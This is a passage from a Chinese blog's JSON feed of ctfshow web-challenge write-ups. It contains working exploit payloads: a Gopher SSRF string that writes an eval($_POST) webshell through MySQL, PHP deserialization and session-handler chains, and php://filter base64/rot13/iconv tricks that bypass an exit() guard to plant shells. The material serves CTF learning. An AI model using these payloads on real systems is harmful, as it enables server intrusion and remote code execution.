data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">dbCtrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token variable\">$uh</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">UpdateHelper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token variable\">$info</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token variable\">$uh</span><span class=\"token operator\">-></span><span class=\"token property\">sql</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token property\">nickname</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$info</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token variable\">$info</span><span class=\"token operator\">-></span><span class=\"token property\">CtrlCase</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">// 此为 nickname 的值</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"into\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">151</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"\\\";s:8:\\\"CtrlCase\\\";\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uh</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&#125;\"</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><h1 id=\"web15-fishman\"><a class=\"anchor\" href=\"#web15-fishman\">#</a> web15 Fishman</h1>\n<p>不会</p>\n<h1 id=\"红包题第九弹\"><a class=\"anchor\" href=\"#红包题第九弹\">#</a> 红包题第九弹</h1>\n<p>SSRF Gopher 协议 攻击 mysql 写入</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token string\">'&lt;?php eval($_POST[1]); ?>'</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">OUTFILE</span> <span class=\"token string\">'/var/www/html/1.php'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>数据库名臣为 root<br />\n 是由 Gopher 工具<br />\n生成</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%27%01%00%00%00%01</pre></td></tr></table></figure><p>之后进行 url 编码<br />\n最后 payload 为</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>u&#x3D;Username&amp;returl&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%253f%253e%2527%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2527%2501%2500%2500%2500%2501</pre></td></tr></table></figure><p>最后访问 1.php，正常 rce</p>\n<h1 id=\"nl\"><a class=\"anchor\" href=\"#nl\">#</a> nl</h1>\n<p>Linux 中可以将文件名作为函数和参数，通过星号通配执行</p>\n<p>新建一个名称是 nl 的文件作为指令</p>\n<p><code>?1=&gt;nl</code> <br />\n 将右尖括号左侧的内容写入右侧文件，因此相当于新建了一个叫 nl 的空文件</p>\n<p><code>?1=*&gt;z</code></p>\n<p><code>*</code>  代表当前文件夹下的所有文件<br />\n <code>*&gt;z</code>  就是就是把当前文件夹的文件显示在 <code>z</code>  中<br />\n这样就只有文件 z 的内容就是 <code>nl index.php</code></p>\n<p>之后访问该文件，会自动下载该文件，文件内内容有 flag</p>\n<h1 id=\"红包题-耗子尾汁\"><a class=\"anchor\" href=\"#红包题-耗子尾汁\">#</a> 红包题 耗子尾汁</h1>\n<p>在 php 当中默认命名空间是 \\，所有原生函数和类都在这个命名空间中。普通调用一个函数，</p>\n<p>如果直接写函数名 function_name () 调用，调用的时候其实相当于写了一个相对路径；</p>\n<p>而如果写 \\function_name () 这样调用函数，则其实是写了一个绝对路径。如果你在其他 namespace 里调用系统类，就必须写绝对路径这种写法</p>\n<p>解一：<br />\n <code>a=\\system&amp;b[]=ls</code> <br />\n <code>a=\\system&amp;b[]=cat flag.php</code> <br />\n 解二：<br />\n套娃<br />\n <code>a=forward_static_call_array&amp;b[0]=system&amp;b[1][0]=ls</code></p>\n<h1 id=\"一切看起来都那么合情合理\"><a class=\"anchor\" href=\"#一切看起来都那么合情合理\">#</a> 一切看起来都那么合情合理</h1>\n<p>分析完代码，我们的思路就比较明确啦，我们可以利用 <code>index.php</code>  里面的 <code>session_start()</code>  设置，控制 $_SESSION 的值（也就是 limit）写入我们的 payload 到服务器的 <code>/tmp/sess_xxxx</code> ，然后利用 <code>nc.php </code> 里面的 <code>ini_set('session.serialize_handler', 'php')</code>  设置去反序列化服务器上的 <code>/tmp/sess_xxxx</code>  文件，从而执行 <code>inc.php</code>  里面 <code>User</code>  类的 <code>file_put_contents()</code>  函数写入一句话</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> * @Author       : zhong</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> * @since        : 2022-07-21 23:57:24</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> * @LastAuthor   : zhong</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> * @lastTime     : 2022-07-22 00:31:02</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$status</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"|\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1.php'</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"&lt;?php system('cat fl*');?>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><code>|O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:26:&quot;&lt;?php system('cat fl*');?&gt;&quot;;s:6:&quot;status&quot;;N;&#125;</code></p>\n<p>修改 <code>index.php</code>  的 <code>session</code>  值， <code>limit</code>  为上述代码得到的 base64 编码内容，之后不断提交并访问 <code>inc/inc.php</code> , 最后访问 <code>log-1.php</code></p>\n<p>得到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>使用<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 16:07:03</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-06 19:21:29</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"ctfshow&#123;136f0acc-0af6-4036-bea1-48e6e7ee1258&#125;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>登陆失败<span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token number\">2022</span><span class=\"token operator\">-</span><span class=\"token number\">07</span><span class=\"token operator\">-</span><span class=\"token number\">22</span> <span class=\"token number\">00</span><span class=\"token punctuation\">:</span><span class=\"token number\">28</span><span class=\"token punctuation\">:</span><span class=\"token number\">30</span></span></pre></td></tr></table></figure><h1 id=\"新年好\"><a class=\"anchor\" href=\"#新年好\">#</a> 新年好？</h1>\n<p>payload: <code>/flag?delay=2147483648</code></p>\n<p><code>setTimeout</code>  最多只能推迟执行 <code>2147483647</code>  毫秒（24.8 天），超过这个时间会发生溢出，导致回调函数将在当前任务队列结束后立即执行</p>\n",
            "tags": [
                "CTF",
                "ctfshow",
                "Web"
            ]
        },
        {
            "id": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B_2022/",
            "url": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B_2022/",
            "title": "新春欢乐赛_2022",
            "date_published": "2022-10-04T03:07:26.000Z",
            "content_html": "<h1 id=\"热身\"><a class=\"anchor\" href=\"#热身\">#</a> 热身</h1>\n<p>开局看到源码，但是却没有显示源码的代码。那么只能是被包含进去了，直接 phpinfo 搜 append 可以看到包含的文件，查看之得到 flag</p>\n<p>涉及到： <code>phpinfo()</code> , <code>append </code></p>\n<p><strong>phpinfo():</strong> 输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP 环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和 PHP 授权信息 (License)。</p>\n<h1 id=\"web-1\"><a class=\"anchor\" href=\"#web-1\">#</a> Web 1</h1>\n<p>对  <code>file_put_contents($content,'&lt;?php exit();'.$content);</code>  的绕过</p>\n<p>在这里，由于将  <code>exit();</code>  写入了文件，那么即使成功传入一句话木马，也无法执行，那么需要绕过  <code>exit()</code></p>\n<h2 id=\"绕过方法\"><a class=\"anchor\" href=\"#绕过方法\">#</a> 绕过方法</h2>\n<h3 id=\"round-1\"><a class=\"anchor\" href=\"#round-1\">#</a> Round 1</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'&lt;?php exit; ?>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$content</span> <span class=\"token operator\">.=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'txt'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><code>$content</code>  在开头增加了  <code>exit</code>  过程，导致即使我们成功写入一句话，也执行不了。幸运的是，这里的</p>\n<p><code>$_POST['filename']</code>  是可以控制协议的，我们即可使用  <code>php://filter</code>  协议来施展魔法</p>\n<h4 id=\"方法一-base64-编码\"><a class=\"anchor\" href=\"#方法一-base64-编码\">#</a> 方法一、base64 编码</h4>\n<p>使用 <code>php://filter</code>  流的 <code>base64-decode</code>  方法，将 <code>$content</code>  解码，利用 <code>php base64_decode </code> 函数特性去除 “死亡 exit”。</p>\n<p>众所周知，base64 编码中只包含 64 个可打印字符 <code>（A-Z a-z 0-9 + /）'='</code>  补位，而 PHP 在解码 base64 时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>\n<p>所以，当 <code>$content</code>  被加上了 <code>&lt;?php exit;?&gt;</code>  后，我们可以使用 <code>php://filter/write=convert.base64-decode</code>  来首先对其解码。在解码的过程中，字符 <code> &lt;、?、;、&gt;、空格</code> 等一共有 7 个字符不符合 base64 编码的字符范围将被忽略，所以最终被解码的字符仅有 “phpexit” 和我们传入的其他字符。</p>\n<p>“phpexit” 一共 7 个字符，<strong>因为 base64 算法解码时是 4 个 byte 一组</strong>，所以给他增加 1 个 “a” 一共 8 个字符。这样，&quot;phpexita&quot; 被正常解码，而后面我们传入的 webshell 的 base64 内容也被正常解码。结果就是  没有了。</p>\n<p>最终效果:</p>\n<p><img data-src=\"https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200406235335043-1930261389.png\" alt=\"\" /></p>\n<h4 id=\"方法二-利用字符串操作方法-base64-组合拳\"><a class=\"anchor\" href=\"#方法二-利用字符串操作方法-base64-组合拳\">#</a> 方法二、利用字符串操作方法 + base64 组合拳</h4>\n<p>除了使用 base64 特性的方法外，我们还可以利用 <code>php://filter</code>  字符串处理方法来去除 “死亡 exit”。我们观察一下，这个 <code>&lt;?php exit; ?&gt;</code>  实际上是什么？</p>\n<p>这实际上是一个 XML 标签，既然是 XML 标签，我们就可以利用 strip_tags 函数去除它，而 php://filter 刚好是支持这个方法的。</p>\n<p>编写如下测试代码即可查看 <code>php://filter/read=string.strip_tags/resource=php://input</code>  的效果：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://filter/read=string.strip_tags/resource=php://input'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200406234627327-1601681134.png\" alt=\"\" /></p>\n<p>可见， <code>?php exit; ?&gt;</code>  被去除了。但回到上面的题目，我们最终的目的是写入一个 webshell，而写入的 webshell 也是 php 代码，如果使用 <code>strip_tags</code>  同样会被去除。</p>\n<p>万幸的是， <code>php://filter</code>  允许使用多个过滤器，我们可以先将 webshell 用 base64 编码。在调用完成 <code>strip_tags</code>  后再进行 <code>base64-decode</code> 。“死亡 exit” 在第一步被去除，而 webshell 在第二步被还原。</p>\n<p>最终效果：</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/web1_3.png\" alt=\"\" /></p>\n<h4 id=\"方法三-rot13-编码\"><a class=\"anchor\" href=\"#方法三-rot13-编码\">#</a> 方法三、ROT13 编码</h4>\n<p>原理和上面类似，核心是将 “死亡 exit” 去除。 <code>&lt;?php exit; ?&gt;</code>  在经过 rot13 编码后会变成 <code>&lt;?cuc rkvg; ?&gt;</code></p>\n<p>在 PHP 不开启 <code>short_open_tag</code>  时，php 不认识这个字符串，当然也就不会执行了</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/web1_4.png\" alt=\"\" /></p>\n<h3 id=\"round-2\"><a class=\"anchor\" href=\"#round-2\">#</a> Round 2</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'txt'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&lt;?php exit();\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>这种是前后两个变量相同，假设 <code>$a</code>  可控情况。</p>\n<p>这种相同变量的构造方式和不同变量的构造方式思路是大差不差的，都是需要干掉 <code>&lt;?php exit();</code> ，只不过构造起来相对更复杂一些。</p>\n<h4 id=\"方法一-base64-编码-2\"><a class=\"anchor\" href=\"#方法一-base64-编码-2\">#</a> 方法一、base64 编码</h4>\n<p>根据前面介绍的不同变量的构造方法，很容易拓展到相同的变量，同样利用 <code>php://filter</code>  来构造，反正后面是写入的内容，只要在后面解码的时候把 shell 解码出来，不需要的东西解码成乱码即可，而 Base64 构造的话，例如</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$a=php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+/resource=shell.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>（    <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>    base64编码    PD9waHAgcGhwaW5mbygpOz8+      ）</pre></td></tr></table></figure><p>构造的 shell 可以放在过滤器的位置和文件名位置都可以（其他编码有时候会有空格什么的乱码，文件名不一定好用）， <code>php://filter</code>  面对不可用的规则（一串 base64）是报个 Warning，绕后跳过继续执行的（不会退出），所以按理说这样构造是 “很完美” 的。我们看下 <code>base-decode</code>  哪些字符👇</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convertbase64decodePD9waHAgcGhwaW5mbygpOz8+&#x2F;resource&#x3D;shell.php</pre></td></tr></table></figure><p>而默认情况下 base64 编码是以 <code>=</code>  作为结尾的，所以正常解码的时候到了 <code>=</code>  就解码结束了，即使我们构造 payload 的时候不用 <code>write=</code> ，但是在最后获取文件名的时候 <code>resource=</code>  中的 <code>=</code>  过不掉，所以导致过滤器解码失败，从而报错...</p>\n<p>这里用 base64 编码我还没找到好的方法，待补充...</p>\n<h4 id=\"方法二-rot13\"><a class=\"anchor\" href=\"#方法二-rot13\">#</a> 方法二、ROT13</h4>\n<p>rot13 编码就不存在 base64 的问题，所以和前面 base64 构造的思路一样</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$a = php://filter/write=string.rot13|<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>cuc <span class=\"token function\">cucvasb</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>/resource=shell.php</pre></td></tr></table></figure><p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/web1_5.png\" alt=\"\" /></p>\n<p>和前面提到的一样，这种方法是需要服务器没有开启短标签的时候才可以使用 (默认情况是没开启的： <code>php.ini</code>  中的 <code>short_open_tag</code> )</p>\n<h4 id=\"方法三-iconv-字符编码转换\"><a class=\"anchor\" href=\"#方法三-iconv-字符编码转换\">#</a> 方法三、iconv 字符编码转换</h4>\n<p>通过字符转换把 <code>&lt;?php exit();</code>  转成不能解析的，这里采用的是 UCS-2 或者 UCS-4 编码方式，而我们构造的转成可正常解析的</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>#echo iconv(\"UCS-2LE\",\"UCS-2BE\",'<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>');</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>hp</span> <span class=\"token attr-name\">phpipfn(o;)</span><span class=\"token punctuation\">></span></span>?</pre></td></tr></table></figure><p>这里用的是 UCS-2，当然我们也可以用 UCS-4</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>echo iconv(\"UCS-4LE\",\"UCS-4BE\",'aa<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>');</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>aa</span> <span class=\"token attr-name\">phpiphp(ofn</span><span class=\"token punctuation\">></span></span>?;)</pre></td></tr></table></figure><p>通过 UCS-2 或者 UCS-4 的方式，对目标字符串进行 2/4 位一反转，也就是说构造的需要是 UCS-2 或 UCS-4 中 2 或者 4 的倍数，不然不能进行反转，那我们就可以利用这种过滤器进行编码转换绕过了，构造 payload</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)>?/resource=shell.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">**</span><span class=\"token keyword\">or</span><span class=\"token operator\">**</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'php://filter/convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn>?;)/resource=shell.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#由于是 4 位一反转，所以需要保证？&lt;aa phpiphp (ofn>?;) 之前字符个数是 4 的倍数，所以补充了 xxx</span></pre></td></tr></table></figure><p><img data-src=\"https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407105517997-451500709.png\" alt=\"\" /></p>\n<h4 id=\"方法四-iconv-字符编码转换-rot13-编码组合拳\"><a class=\"anchor\" href=\"#方法四-iconv-字符编码转换-rot13-编码组合拳\">#</a> 方法四、iconv 字符编码转换 + ROT13 编码组合拳</h4>\n<p>和前后不同的变量的利用一样，相同变量一样可以使用组合拳，原因前面描述过了，就不赘述，这里就用 UCS-2 和 rot13 举一个例子吧</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$a = 'php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>uc</span> <span class=\"token attr-name\">cucvcsa(b;)</span><span class=\"token punctuation\">></span></span>?/resource=shell.php'</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>#先将 <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span> 进行rot13得到<span class=\"token php language-php\"><span class=\"token delimiter 